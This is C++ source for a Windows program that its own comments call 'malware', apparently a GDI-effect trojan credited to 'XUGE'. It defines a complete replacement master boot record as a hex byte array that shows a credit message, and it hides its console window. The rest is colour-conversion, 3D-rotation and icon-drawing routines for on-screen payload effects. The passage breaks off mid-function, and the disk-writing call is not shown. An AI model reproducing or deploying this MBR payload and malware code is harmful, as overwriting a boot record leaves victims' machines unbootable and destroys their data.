#include <iostream>
#include <memory>
#include <stdio.h>
#include <tchar.h>
#include <time.h>
#include <windows.h>
#include <windef.h>
#include <fstream>
#include <cstdlib>
#include <ctime>
#include <math.h>
#include "cmath"
#pragma comment(lib, "Winmm.lib")
#pragma comment( linker, "/subsystem:\"windows\" /entry:\"mainCRTStartup\"" )
#define PI 3.141592653589793f
#define DESKTOP_WINDOW ((HWND)0)
#define mbrsize 4096
#define boot "\x31\xC0\x8E\xD8\x8E\xC0\x8E\xD0\xBC\x00\x7C\x89\xE5\xB8\x00\x80\x8E\xC0\x8E\xD8\xFA\xB8\x06\x02\xB9\x01\x00\xB6\x00\xBB\x00\x00\xCD\x13\x80\xFC\x00\x75\xEE\x06\xB8\x2D\x00\x50\xCB\xB9\x07\x26\xB4\x01\xB7\x00\xCD\x10\xB8\x03\x10\xB3\x00\xCD\x10\xB4\x07\xB0\x00\xB7\x6F\xB9\x00\x00\xBA\x4F\x18\xCD\x10\xB6\x00\xB2\x00\xB4\x02\xB7\x00\xCD\x10\xBD\x00\x02\xB4\x0E\xBE\xFF\xFF\x46\x3E\x80\x3A\x00\x74\x0D\x55\x3E\x8A\x42\x00\xBB\x07\x00\xCD\x10\x5D\xEB\xEC\xF4\xEB\xFD\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x55\xAA\x43\x61\x6D\x65\x72\x61\x2E\x65\x78\x65\x20\x62\x79\x20\x58\x55\x47\x45\x0D\x0A\x0D\x0A\x68\x74\x74\x70\x73\x3A\x2F\x2F\x73\x70\x61\x63\x65\x2E\x62\x69\x6C\x69\x62\x69\x6C\x69\x2E\x63\x6F\x6D\x2F\x31\x37\x34\x31\x37\x38\x30\x36\x30\x33\x0D\x0A\x68\x74\x74\x70\x73\x3A\x2F\x2F\x77\x77\x77\x2E\x69\x78\x69\x67\x75\x61\x2E\x63\x6F\x6D\x2F\x68\x6F\x6D\x65\x2F\x33\x30\x37\x34\x36\x38\x32\x32\x38\x32\x30\x34\x39\x37\x39\x36\x0D\x0A\x68\x74\x74\x70\x73\x3A\x2F\x2F\x77\x77\x77\x2E\x79\x6F\x75\x74\x75\x62\x65\x2E\x63\x6F\x6D\x2F\x40\x58\x55\x47\x45\x2D\x6B\x38\x72\x0D\x0A\x68\x74\x74\x70\x73\x3A\x2F\x2F\x67\x69\x74\x68\x75\x62\x2E\x63\x6F\x6D\x2F\x41\x57\x4A\x44\x58\x55\x47\x45\x0D\x0A\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
using namespace std;
double intensity = 0.0;
bool state = false;
typedef struct
{
    float x;
    float y;
    float z;
} VERTEX;

typedef union _RGBQUAD {
    COLORREF rgb;
    struct {
        BYTE r;
        BYTE g;
        BYTE b;
        BYTE Reserved;
    };
}_RGBQUAD, * PRGBQUAD;

struct Point3D {
    float x, y, z;
};

typedef struct
{
    int vtx0;
    int vtx1;
} EDGE;

typedef struct
{
    FLOAT h;
    FLOAT s;
    FLOAT l;
} HSL;

namespace Colors
{
    //These HSL functions was made by Wipet, credits to him!
    //OBS: I used it in 3 payloads

    //Btw ArTicZera created HSV functions, but it sucks unfortunatelly
    //So I didn't used in this malware.

    HSL rgb2hsl(RGBQUAD rgb)
    {
        HSL hsl;

        BYTE r = rgb.rgbRed;
        BYTE g = rgb.rgbGreen;
        BYTE b = rgb.rgbBlue;

        FLOAT _r = (FLOAT)r / 255.f;
        FLOAT _g = (FLOAT)g / 255.f;
        FLOAT _b = (FLOAT)b / 255.f;

        FLOAT rgbMin = min(min(_r, _g), _b);
        FLOAT rgbMax = max(max(_r, _g), _b);

        FLOAT fDelta = rgbMax - rgbMin;
        FLOAT deltaR;
        FLOAT deltaG;
        FLOAT deltaB;

        FLOAT h = 0.f;
        FLOAT s = 0.f;
        FLOAT l = (FLOAT)((rgbMax + rgbMin) / 2.f);

        if (fDelta != 0.f)
        {
            s = l < .5f ? (FLOAT)(fDelta / (rgbMax + rgbMin)) : (FLOAT)(fDelta / (2.f - rgbMax - rgbMin));
            deltaR = (FLOAT)(((rgbMax - _r) / 6.f + (fDelta / 2.f)) / fDelta);
            deltaG = (FLOAT)(((rgbMax - _g) / 6.f + (fDelta / 2.f)) / fDelta);
            deltaB = (FLOAT)(((rgbMax - _b) / 6.f + (fDelta / 2.f)) / fDelta);

            if (_r == rgbMax)      h = deltaB - deltaG;
            else if (_g == rgbMax) h = (1.f / 3.f) + deltaR - deltaB;
            else if (_b == rgbMax) h = (2.f / 3.f) + deltaG - deltaR;
            if (h < 0.f)           h += 1.f;
            if (h > 1.f)           h -= 1.f;
        }

        hsl.h = h;
        hsl.s = s;
        hsl.l = l;
        return hsl;
    }

    RGBQUAD hsl2rgb(HSL hsl)
    {
        RGBQUAD rgb;

        FLOAT r = hsl.l;
        FLOAT g = hsl.l;
        FLOAT b = hsl.l;

        FLOAT h = hsl.h;
        FLOAT sl = hsl.s;
        FLOAT l = hsl.l;
        FLOAT v = (l <= .5f) ? (l * (1.f + sl)) : (l + sl - l * sl);

        FLOAT m;
        FLOAT sv;
        FLOAT fract;
        FLOAT vsf;
        FLOAT mid1;
        FLOAT mid2;

        INT sextant;

        if (v > 0.f)
        {
            m = l + l - v;
            sv = (v - m) / v;
            h *= 6.f;
            sextant = (INT)h;
            fract = h - sextant;
            vsf = v * sv * fract;
            mid1 = m + vsf;
            mid2 = v - vsf;

            switch (sextant)
            {
            case 0:
                r = v;
                g = mid1;
                b = m;
                break;
            case 1:
                r = mid2;
                g = v;
                b = m;
                break;
            case 2:
                r = m;
                g = v;
                b = mid1;
                break;
            case 3:
                r = m;
                g = mid2;
                b = v;
                break;
            case 4:
                r = mid1;
                g = m;
                b = v;
                break;
            case 5:
                r = v;
                g = m;
                b = mid2;
                break;
            }
        }

        rgb.rgbRed = (BYTE)(r * 255.f);
        rgb.rgbGreen = (BYTE)(g * 255.f);
        rgb.rgbBlue = (BYTE)(b * 255.f);

        return rgb;
    }
}

namespace _3D
{
    VOID RotateX(VERTEX* vtx, float angle)
    {
        vtx->y = cos(angle) * vtx->y - sin(angle) * vtx->z;
        vtx->z = sin(angle) * vtx->y + cos(angle) * vtx->z;
    }
    VOID RotateY(VERTEX* vtx, float angle)
    {
        vtx->x = cos(angle) * vtx->x + sin(angle) * vtx->z;
        vtx->z = -sin(angle) * vtx->x + cos(angle) * vtx->z;
    }
    VOID RotateZ(VERTEX* vtx, float angle)
    {
        vtx->x = cos(angle) * vtx->x - sin(angle) * vtx->y;
        vtx->y = sin(angle) * vtx->x + cos(angle) * vtx->y;
    }
    void DrawEdge(HDC dc, LPCWSTR icon, int x0, int y0, int x1, int y1, int r)
    {
        int dx = abs(x1 - x0);
        int dy = -abs(y1 - y0);
        int sx = (x0 < x1) ? 1 : -1;
        int sy = (y0 < y1) ? 1 : -1;
        int error = dx + dy;
        int i = 0;
        HINSTANCE HSHELL32 = LoadLibrary(_T("shell32.dll"));
        while (true)
        {
            if (i == 0)
            {
                DrawIconEx(dc, x0, y0, LoadIcon(HSHELL32, MAKEINTRESOURCE(rand() % 336)), 12, 12, NULL, NULL, DI_NORMAL);
                i = 10;
            }
            else
            {
                i--;
            }
            if (x0 == x1 && y0 == y1)
            {
                break;
            }
